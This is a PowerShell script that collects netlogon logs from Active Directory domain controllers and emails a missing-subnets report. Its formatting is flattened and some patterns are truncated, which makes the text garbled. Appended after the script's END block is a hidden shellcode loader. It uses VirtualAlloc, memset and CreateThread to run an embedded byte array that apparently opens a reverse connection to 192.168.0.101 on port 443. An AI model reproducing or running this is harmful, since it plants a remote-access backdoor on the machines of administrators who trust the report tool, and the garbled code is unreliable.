[CmdletBinding()]PARAM ([Parameter(Mandatory = $true, HelpMessage = "You must specify the Sender Email Address")][ValidatePattern("[a-z0-9![String]$EmailFrom,[Parameter(Mandatory = $true, HelpMessage = "You must specify the Destination Email Address")][ValidatePattern("[a-z0-9![String[]]$EmailTo,[Parameter(Mandatory = $true, HelpMessage = "You must specify the Email Server to use (IPAddress or FQDN)")][String]$EmailServer,[ValidateRange(0,65535)][int]$EmailServerPort = 25,[String]$EmailSubject = "Report - Active Directory - SITE - Missing Subnets",[Int]$LogsLines = "-200",[Switch]$KeepLogs,[ValidateScript({ Test-Path -Path $_})][String]$HTMLReportPath)BEGIN{TRY{$ScriptPath = (Split-Path -Path ((Get-Variable -Name MyInvocation).Value).MyCommand.Path)$ScriptPathOutput = $ScriptPath + "\Output"IF (-not (Test-Path -Path $ScriptPathOutput)){Write-Verbose -Message "[BEGIN] Creating the Output Folder : $ScriptPathOutput"New-Item -Path $ScriptPathOutput -ItemType Directory -ErrorAction 'Stop' | Out-Null}$DateFormat = Get-Date -Format "yyyyMMdd_HHmmss"$ReportDateFormat = Get-Date -Format "yyyy\MM\dd HH:mm:ss"$ReportTitle = "<H2>" +"Report - Active Directory - SITE - Missing Subnets" +"</H2>"$Report = "<p style=`"background-color:white;font-family:consolas;font-size:9pt`">" +"<strong>Report Time:</strong> $DateFormat <br>" +"<strong>Account:</strong> $env:userdomain\$($env:username.toupper()) on $($env:ComputerName.toUpper())" +"</p>"$Head = "<style>" +"BODY{background-color:white;font-family:consolas;font-size:11pt}" +"TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse}" +"TH{border-width: 1px;padding: 3px;border-style: solid;border-color: black;background-color:`""TD{border-width: 1px;padding-right: 2px;padding-left: 2px;padding-top: 0px;padding-bottom: 0px;border-style: solid;border-color: black;background-color:white}" +"</style>"+'<style type="text/css">table.gridtable {font-family: verdana,arial,sans-serif;font-size:11px;color:border-width: 1px;border-color: border-collapse: collapse;}table.gridtable th {border-width: 1px;padding: 8px;border-style: solid;border-color: background-color: }table.gridtable td {border-width: 1px;padding: 8px;border-style: solid;border-color: background-color: }</style>'$Head2 = "<style>" +"BODY{background-color:white;font-family:consolas;font-size:9pt;}" +"TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}" +"TH{border-width: 1px;padding: 3px;border-style: solid;border-color: black;background-color:`""TD{border-width: 1px;padding-right: 2px;padding-left: 2px;padding-top: 0px;padding-bottom: 0px;border-style: solid;border-color: black;background-color:white}" +"</style>"$TableCSS = @"<style type="text/css">table.gridtable {font-family: verdana,arial,sans-serif;font-size:11px;color:border-width: 1px;border-color: border-collapse: collapse;}table.gridtable th {border-width: 1px;padding: 8px;border-style: solid;border-color: background-color: }table.gridtable td {border-width: 1px;padding: 8px;border-style: solid;border-color: background-color: }</style>"@$PostContent = "<font size=`"1`" color=`"black`"><br><br><i><u>Generated from:</u> $($env:COMPUTERNAME.ToUpper()) <u>on</u> $(Get-Date -Format "yyyy/MM/dd HH:mm:ss")</i></font>"$Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()$ForestName = $Forest.Name.ToUpper()Write-Verbose -Message "[BEGIN] Forest: $ForestName"}CATCH{Write-Warning -Message "BEGIN BLOCK - Something went wrong"Write-Warning -Message $Error[0].Exception.Message}}PROCESS{TRY{FOREACH ($Domain in $Forest.Domains){$DomainName = $Domain.Name.ToUpper()Write-Verbose -Message "[PROCESS] FOREST: $ForestName DOMAIN: $domainName - Getting all Domain Controllers from ..."$DomainControllers = $domain | ForEach-Object -Process { $_.DomainControllers } | Select-Object -Property NameWrite-Verbose "[PROCESS] FOREST: $ForestName DOMAIN: $domainName - Gathering Logs from Domain controllers"FOREACH ($dc in $DomainControllers){$DCName = $($dc.Name).toUpper()TRY{Write-Verbose -Message "[PROCESS] FOREST: $ForestName DOMAIN: $domainName - $DCName - Gathering Logs"$path = "\\$DCName\admin`$\debug\netlogon.log"IF ((Test-Path -Path $path) -and ((Get-Item -Path $path).Length -ne $null)){IF ((Get-Content -Path $path | Measure-Object -Line).lines -gt 0){Write-Verbose -Message "[PROCESS] FOREST: $ForestName DOMAIN: $domainName - $DCName - NETLOGON.LOG - Copying..."Copy-Item -Path $path -Destination $ScriptPathOutput\$DomainName-$DCName-$DateFormat-netlogon.log((Get-Content -Path $ScriptPathOutput\$DomainName-$DCName-$DateFormat-netlogon.log -ErrorAction Continue)[$LogsLines .. -1]) |Out-File -FilePath "$ScriptPathOutput\$DomainName-$DCName.txt" -ErrorAction 'Continue' -ErrorVariable ErrorOutFileNetLogonWrite-Verbose -Message "[PROCESS] FOREST: $ForestName DOMAIN: $domainName - $DCName - NETLOGON.LOG - Copied"}ELSE { Write-Verbose -Message "[PROCESS] FOREST: $ForestName DOMAIN: $domainName - $DCName - NETLOGON File Empty !!" }}ELSE { Write-Warning -Message "[PROCESS] FOREST: $ForestName DOMAIN: $domainName - $DCName - NETLOGON.log is not reachable" }$FilesToCombine = Get-Content -Path $ScriptPathOutput\*.txt -ErrorAction SilentlyContinueIF ($FilesToCombine){IF ($FilesToCombine[0] -match "\[\d{1,5}\]"){Write-Verbose -Message "[PROCESS] FOREST: $ForestName DOMAIN: $domainName - Importing exported data to a CSV format..."Write-Verbose -Message "[PROCESS] FOREST: $ForestName DOMAIN: $domainName - NETLOGON format: 2012"$ImportString = $FilesToCombine | ConvertFrom-Csv -Delimiter ' ' -Header Date, Time, Code, Domain, Error, Name, IPAddress}IF($FilesToCombine[0] -notmatch "\[\d{1,5}\]"){Write-Verbose -Message "[PROCESS] FOREST: $ForestName DOMAIN: $domainName - Importing exported data to a CSV format..."Write-Verbose -Message "[PROCESS] FOREST: $ForestName DOMAIN: $domainName - NETLOGON format: 2008 and Previous versions"$ImportString = $FilesToCombine | ConvertFrom-Csv -Delimiter ' ' -Header Date, Time, Domain, Error, Name, IPAddress,Code}Write-Verbose -Message "[PROCESS] FOREST: $ForestName DOMAIN: $domainName - Importing exported data to a CSV format..."$ImportString = $FilesToCombine | ConvertFrom-Csv -Delimiter ' ' -Header Date, Time, Code, Domain, Error, Name, IPAddress$importString | Where-Object { $_.Error -like "*NO_CLIENT_SITE*" } | Export-Csv -LiteralPath $scriptpathOutput\$ForestName-$dateformat-NOCLIENTSITE.csv -Append$importString | Where-Object { $_.Error -notlike "*NO_CLIENT_SITE*" } | Export-Csv -LiteralPath $scriptpathOutput\$ForestName-$dateformat-OTHERERRORS.csv -Append}ELSE { Write-Verbose -Message "[PROCESS] Nothing to process" }}CATCH{Write-Warning -Message "$ForestName - $domainName - $DCName - Something wrong happened"if ($ErrorOutFileNetLogon) { Write-Warning -Message "$ForestName - $domainName - $DCName - Error with Out-File" }}}}$MissingSubnets = Import-Csv -LiteralPath $scriptpathOutput\$ForestName-$dateformat-NOCLIENTSITE.csv$OtherErrors = Import-Csv -LiteralPath $scriptpathOutput\$ForestName-$dateformat-OTHERERRORS.csvWrite-Verbose -Message "[PROCESS] $ForestName - Building the HTML Report"$EmailBody += "<h1><u>Forest:</u> $($ForestName.ToUpper())</h1>"$EmailBody += "<h2><u>Domain</u>: $($DomainName.ToUpper())</h2>"$EmailBody += "<h3>Missing Subnet(s) for $($DomainName.ToUpper())</h3>"IF ($MissingSubnets){$EmailBody += "<i>List of Active Directory client that can not find their site.<br> You need to add those subnets into the console Active Directory Sites And Services</i>"$EmailBody += $MissingSubnets | Sort-Object IPAddress -Unique | ConvertTo-Html -property IPAddress,Name,Date,Domain,Code, Error -Fragment }ELSE { $EmailBody += "<i>No Missing Subnet(s) detected</i>" }$EmailBody += "<h2>Other Error(s)</h2>"IF ($OtherErrors){$EmailBody += "<br><font size=`"1`" color=`"red`">"Get-ChildItem $scriptpathoutput\$DomainName-*.txt -Exclude "*All_Export*" |ForEach-Object{$CurrentFile = Get-Content $_ | Where-Object { $_ -notlike "*NO_CLIENT_SITE*" }IF ($CurrentFile){$EmailBody += "<font size=`"2`"><b>$($_.basename)</b><br></font>"$EmailBody += "<br><font size=`"1`" color=`"red`">"FOREACH ($Line in $CurrentFile){$EmailBody += "$line<br>"}$EmailBody += "</font>"}}}ELSE { $EmailBody += "<i>No Other Error detected</i>" }}CATCH{Write-Warning -Message "[PROCESS] Something wrong happened"Write-Warning -Message $Error[0].Exception.Message}FINALLY{$EmailBody += $PostContent$EmailBody = $EmailBody -replace "<table>", '<table class="gridtable">'$FinalEmailBody = ConvertTo-Html -Head $Head -PostContent $EmailBodyWrite-Verbose -Message "[PROCESS] Preparing the final Email"$SmtpClient = New-Object -TypeName system.net.mail.smtpClient$SmtpClient.host = $EmailServer$SmtpClient.Port = $EmailServerPort$MailMessage = New-Object -TypeName system.net.mail.mailmessage$MailMessage.from = $EmailFromFOREACH ($To in $Emailto) { $MailMessage.To.add($($To)) }$MailMessage.IsBodyHtml = $true$MailMessage.Subject = $EmailSubject$MailMessage.Body = $FinalEmailBody$SmtpClient.Send($MailMessage)Write-Verbose -Message "[PROCESS] Email Sent!"if ($PSBoundParameters['HTMLReportPath']){$FinalEmailBody | Out-File -LiteralPath (Join-Path -Path $HTMLReportPath -ChildPath "$ForestName-$dateformat-Report.html")}}}END{IF (-not $KeepLogs){Write-Verbose "Cleanup txt and log files..."Remove-item -Path $ScriptpathOutput\*.txt -forceRemove-Item -Path $ScriptPathOutput\*.log -forceWrite-Verbose -Message "Script Completed"}}$z67 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $z67 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x65,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ePY=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ePY.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ePY,0,0,0);for (;;){Start-sleep 60};